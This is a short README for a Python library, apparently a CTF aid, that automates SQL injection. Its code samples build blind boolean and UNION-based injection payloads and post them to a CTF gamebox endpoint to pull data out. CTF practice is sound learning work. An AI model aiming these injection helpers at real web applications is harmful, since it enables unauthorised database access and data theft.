# SQLInjectLib

## Introduction

> A library to simplify SQL injections during CTFs

## Code samples

> Extracted from a CTF, some parts were omitted
>
> ### Blind Injection
>
> ```python
> def blind_injection(q: SQL[bool]) -> bool:
>    query = f"animals1' and ({q})--"
>    final_query = replace_all(query)
>    c = post(
>        "http://gamebox1.reply.it/dc5ff0efae41b3500b9ebc0ee9ee5a78c98f41a9/",
>        data={"query": final_query},
>    )
>    return "ANIMALS1" in c.text
> ```
>
> ### Union Injection
>
> ```python
> def union_injection(q: SQL[str]) -> str | None:
>   query = f"hdjhfjdf' union select 'aa','aa;aa',{q},1--"
>   final_query = replace_all(query)
>   c = post(
>       "http://gamebox1.reply.it/dc5ff0efae41b3500b9ebc0ee9ee5a78c98f41a9/",
>       data={"query": final_query},
>   )
>   m = TAG_FINDER.search(c.text)
>   result = m.group(1)
>   return result
> ```

## Installation

> Install locally with:
>
> ```bash
> python3 -m pip install sqlinjectlib
> ```
